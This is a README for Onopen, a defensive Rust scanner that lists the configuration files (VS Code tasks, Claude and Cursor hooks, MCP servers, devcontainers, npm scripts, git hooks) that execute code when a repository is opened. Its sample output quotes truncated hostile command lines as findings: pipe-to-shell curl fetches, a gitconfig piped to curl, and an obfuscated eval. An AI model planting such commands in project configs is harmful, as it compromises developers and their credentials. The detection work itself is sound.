# Onopen

**See what runs when you open a repository.**

You clone something, or an agent clones it for you, and you open it. Before you
read a line, a VS Code task can fire, an agent hook can spawn a shell, an MCP
server can `npx` down a package that no lockfile pins.

Onopen answers one question and does nothing else:

> If I open this, what executes on my machine?

```
  onopen  ./unknown-repo

! .vscode/tasks.json               runOn: folderOpen        curl -fsSL https://…/i.sh | sh
! .claude/settings.json            hook SessionStart        node -e "require('https')…"
! .claude/settings.json            mcp server: helper       npx -y unpinned-helper@latest
! .devcontainer/devcontainer.json  initializeCommand        bash -c 'cat ~/.gitconfig | curl…'
! package.json                     preinstall               node -e "eval(Buffer.from(…))"
~ .githooks/pre-commit             hook script: pre-commit  curl -fsSL https://…/stage2 | sh
· package.json                     dependencies: internal   git+https://…/internal-tools.git

  5 execution paths before you type a line · 1 deferred, 1 to note
```

## Why this exists

Dependency scanners read code and versions. A growing share of supply-chain
attacks don't live there — they live in configuration, which nearly every tool
treats as inert data. Config files that carry a shell command are accepted by
VS Code, Cursor, Claude Code, Gemini CLI, npm, Composer and Bundler, and several
of them execute on folder open or on session start, behind a trust prompt most
people click through.

The standard advice for this today is *review your config files by hand, with
the same care as code*. That is not a defence. It is the absence of one.

## Install

Build from source:

```sh
git clone https://github.com/NULVEC/onopen
cd onopen
cargo build --release
```

The binary lands in `target/release/onopen`.

## Use

```sh
onopen                      # scan the current directory
onopen ./some-repo          # scan a path
onopen --explain            # say why each finding executes
onopen --quiet              # hide files that came back clean
onopen --json               # machine-readable output
onopen --sarif              # SARIF 2.1.0, for GitHub code scanning
onopen --only agents,mcp    # narrow the run
onopen --depth 0            # the root alone, ignoring sub-projects
onopen --show-suppressed    # read what an ignore file silenced
onopen --list-scanners      # what is available
```

## Silencing what you have already read

The first false positive is otherwise also the last run. Put an
`.onopenignore` at the root:

```
# <rule-id | *>   <path glob | *>   # why

npm/install-lifecycle-script  package.json      # reviewed, builds a native module
agent/command-hook            tools/**         # our own bootstrap hooks
*                             vendor/**        # not our code
```

**Silencing is never invisible.** Whatever an ignore file hides is still
counted, and the count is printed even on a report that is otherwise clean:

```
  nothing executes on open.
  2 findings silenced by an ignore file — run with --show-suppressed to read them
```

A scanner that can be told to look away without saying so is worse than no
scanner, because it reports clean with authority. For the same reason
`*  *` is refused: silencing everything is not configuration, it is turning
the tool off, and there is already a way to not run it.

SARIF puts each finding on the line it came from, in the review someone is
already reading, rather than in log output nobody opens. Silenced findings are
included and marked as suppressed rather than dropped, so the machine format
keeps the same promise the human one makes.

**Exit codes.** `0` nothing runs on its own · `1` at least one immediate
execution path · `2` the scan itself failed. Use `--no-fail` to always exit `0`.

## What it reads

| Scanner | Files | Looking for |
|---|---|---|
| `vscode` | `.vscode/tasks.json`, `settings.json`, `launch.json` | `runOn: folderOpen`, settings that hand an extension a binary, terminal env injection |
| `agents` | `.claude/settings*.json`, `.gemini/settings.json`, `.cursor/environment.json` | command hooks, Cursor environment commands, blanket permission allowlists |
| `mcp` | `.mcp.json`, `.vscode/mcp.json`, `.cursor/mcp.json`, agent settings | servers spawned at session start, `npx`/`uvx` fetch-and-run servers |
| `packages` | `package.json`, `composer.json`, `Gemfile` | install lifecycle scripts, dependencies fetched outside the registry, Ruby that shells out |
| `devcontainer` | `.devcontainer/**/devcontainer.json`, `.devcontainer.json` | `initializeCommand` (runs on the **host**), container lifecycle commands, features |
| `githooks` | `.git/config`, `.git/hooks/`, `.githooks/`, `.husky/` | redirected `core.hooksPath`, live hooks, hook scripts waiting to be wired up |

## How findings are ranked

- `!` **immediate** — runs on open, on session start, or on install. No further
  action from you. This is what sets the exit code.
- `~` **deferred** — runs, but only after a deliberate act: installing,
  debugging, committing, building the container.
- `·` **note** — doesn't execute on its own, but widens the surface or removes a
  prompt that would have caught something.

## What it does not do

- **It never executes what it finds.** It reads files and parses them.
- **It never opens a network connection.** No telemetry, no lookups, no updates.
- **It has no accounts, no server, and no paid tier.**

Config files here are parsed as JSONC, because VS Code and devcontainer files
legally contain comments and trailing commas — and a scanner that trips over a
comment reports clean on a file it never read.

## In CI

```yaml
# .github/workflows/onopen.yml
name: onopen
on: [push, pull_request]

permissions:
  contents: read
  security-events: write   # so findings reach the Security tab

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - uses: NULVEC/onopen@v0
```

On a repository that already has findings, start with
`fail-on-findings: false`: the report still reaches the Security tab, the
build stays green, and you decide what to silence before turning the gate on.

The action verifies the digest of the binary it downloads before running it.
A tool whose argument is that you should know what you are about to run has no
business skipping that step itself.

## Known limits

Onopen reports *execution paths*, not intent. A `postinstall` that builds a
native module and one that exfiltrates your `.npmrc` both show up; the tool
tells you where to look, it doesn't judge what it finds.

It walks sub-projects as well as the root, because a monorepo hides a
`folderOpen` task one workspace down and reporting only the top directory calls
that repository clean. Dependency directories — `node_modules`, `vendor`,
`target` and their kin — are never entered: what is in them is not the project
you are opening. `--depth 0` restores the root-only behaviour.

It does not currently read: `.idea/` run configurations, `.github/workflows`
trigger analysis, Gradle or `setup.py` build scripts, or agent instruction files
(`CLAUDE.md`, `AGENTS.md`) that tell an agent to run something in prose.

## Contributing

New detections are the most useful contribution, and each one wants a fixture.
Add the config file under `tests/fixtures/trapped/`, add a test in
`tests/scan.rs` asserting the rule id and severity, then implement the rule.

```sh
cargo test
cargo clippy --all-targets -- -D warnings
cargo fmt --check
```

## License

Apache-2.0. See [LICENSE](LICENSE).

Built by [Veltron](https://veltron.cc).
